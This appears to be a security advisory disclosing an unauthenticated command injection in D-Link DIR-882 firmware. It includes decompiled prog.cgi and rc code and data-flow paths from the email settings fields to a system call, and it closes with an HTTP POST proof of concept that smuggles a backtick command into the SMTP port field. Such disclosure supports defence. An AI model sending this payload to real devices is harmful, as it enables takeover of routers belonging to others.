# Command Injection Vulnerability in `SetSysEmailSettings`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-882 Router                                        |
| Firmware Version     | DIR882A1_FW102B02                                            |
| Vulnerability Type   | **Command Injection**                                        |
| Vulnerable Component | `prog.cgi` (input handling) and `rc` (execution of `sendmail` command) |
| Data Flow            | Cross-binary propagation via NVRAM variables (`nvram_safe_set` â†’ `nvram_safe_get`) |
| Prerequisites        | No authentication required; attacker must supply crafted values through the web management interface (e.g., `SetSysEmailSettings/EmailFrom`, `SMTPServerAddress`, `SMTPServerPort`, `AccountName`). |

2. Exploitation Path

```c
// prog.cgi
int __fastcall sub_433188(int a1)
{
  ...
  v9 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/EmailFrom");
  if ( !*v9 )
    return WebsSetResponseResult(a1, 0);
  nvram_safe_set("SysLogMail_From", v9);
  v1 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/EmailTo");
  if ( !*v1 )
    return WebsSetResponseResult(a1, 0);
  nvram_safe_set("SysLogMail_To", v1);
  v2 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/SMTPServerAddress");
  if ( !*v2 )
    return WebsSetResponseResult(a1, 0);
  nvram_safe_set("SysLogMail_SMTPServerAddress", v2);
  v3 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/SMTPServerPort");
  if ( !*v3 )
    return WebsSetResponseResult(a1, 0);
  nvram_safe_set("SysLogMail_SMTPServerPort", v3);
  v4 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/Authentication");
  v10 = v4;
  if ( !*v4 )
    return WebsSetResponseResult(a1, 0);
  if ( !strcmp(v4, "true") )
    nvram_safe_set("SysLogMail_Auth_Enable", "1");
  else
    nvram_safe_set("SysLogMail_Auth_Enable", "0");
  if ( !strcmp(v10, "true") )
  {
    v11 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/AccountName");
    if ( *v11 )
    {
      nvram_safe_set("SysLogMail_Auth_Name", v11);
  ...
}

// rc
int sub_448FDC()
{
  ...
  if ( nvram_get_int("SysLogMail_Auth_Enable") )
  {
    v5 = (const char *)nvram_safe_get("SysLogMail_From");
    v6 = (const char *)nvram_safe_get("SysLogMail_Auth_Name");
    v7 = (const char *)nvram_safe_get("SysLogMail_Auth_Password");
    v8 = (const char *)nvram_safe_get("SysLogMail_SMTPServerAddress");
    v9 = (const char *)nvram_safe_get("SysLogMail_SMTPServerPort");
    sprintf(
      v33, "sendmail -f %s -H %s:%s@%s:%s -S -w %s -h %s < %s &", v5, v6, v7, v8, v9, v18, v17, "/tmp/MailEnvelop");
  }
  else
  {
    v10 = (const char *)nvram_safe_get("SysLogMail_From");
    v11 = (const char *)nvram_safe_get("SysLogMail_SMTPServerAddress");
    v12 = (const char *)nvram_safe_get("SysLogMail_SMTPServerPort");
    sprintf(v33, "sendmail -f %s -H %s:%s -S -w %s -h %s < %s &", v10, v11, v12, v18, v17, "/tmp/MailEnvelop");
  }
  twsystem(v33, 1);
  ...
}
```

3. **Vulnerable Binaries:** `prog.cgi` and `rc` (with cross-binary data flow).
4. 0-Day Command Injection Exploitation Path: 
   - In `prog.cgi`, line 5 executes `v9 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/EmailFrom")`. The input is stored via line 8 `nvram_safe_set("SysLogMail_From", v9)`. Subsequently, in `rc`, line 54 retrieves the value through `v10 = (const char *)nvram_safe_get("SysLogMail_From")`. After string concatenation, the data is passed into line 59 `twsystem(v33, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 5 executes `v9 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/EmailFrom")`. The input is stored via line 8 `nvram_safe_set("SysLogMail_From", v9)`. Subsequently, in `rc`, line 44 retrieves the value through `v5 = (const char *)nvram_safe_get("SysLogMail_From")`. After string concatenation, the data is passed into line 59 `twsystem(v33, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 17 executes `v3 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/SMTPServerPort")`. The input is stored via line 20 `nvram_safe_set("SysLogMail_SMTPServerPort", v3)`. Subsequently, in `rc`, line 48 retrieves the value through `v9 = (const char *)nvram_safe_get("SysLogMail_SMTPServerPort")`. After string concatenation, the data is passed into line 59 `twsystem(v33, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 17 executes `v3 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/SMTPServerPort")`. The input is stored via line 20 `nvram_safe_set("SysLogMail_SMTPServerPort", v3)`. Subsequently, in `rc`, line 56 retrieves the value through `v12 = (const char *)nvram_safe_get("SysLogMail_SMTPServerPort")`. After string concatenation, the data is passed into line 59 `twsystem(v33, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 13 executes `v2 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/SMTPServerAddress")`. The input is stored via line 16 `nvram_safe_set("SysLogMail_SMTPServerAddress", v2)`. Subsequently, in `rc`, line 47 retrieves the value through `v8 = (const char *)nvram_safe_get("SysLogMail_SMTPServerAddress")`. After string concatenation, the data is passed into line 59 `twsystem(v33, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 13 executes `v2 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/SMTPServerAddress")`. The input is stored via line 16 `nvram_safe_set("SysLogMail_SMTPServerAddress", v2)`. Subsequently, in `rc`, line 55 retrieves the value through `v11 = (const char *)nvram_safe_get("SysLogMail_SMTPServerAddress")`. After string concatenation, the data is passed into line 59 `twsystem(v33, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 31 executes `v11 = (_BYTE *)webGetVarString(a1, "SetSysEmailSettings/AccountName")`. The input is stored via line 34 `nvram_safe_set("SysLogMail_Auth_Name", v11)`. Subsequently, in `rc`, line 45 retrieves the value through `v6 = (const char *)nvram_safe_get("SysLogMail_Auth_Name")`. After string concatenation, the data is passed into line 59 `twsystem(v33, 1)`, leading to a command injection vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/prog.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 220
Connection: close

SetSysEmailSettings/EmailFrom=test@example.com
&SetSysEmailSettings/EmailTo=admin@example.com
&SetSysEmailSettings/SMTPServerAddress=mail.example.com
&SetSysEmailSettings/SMTPServerPort=25;`INJECTED_COMMAND`
&SetSysEmailSettings/Authentication=true
&SetSysEmailSettings/AccountName=attacker
```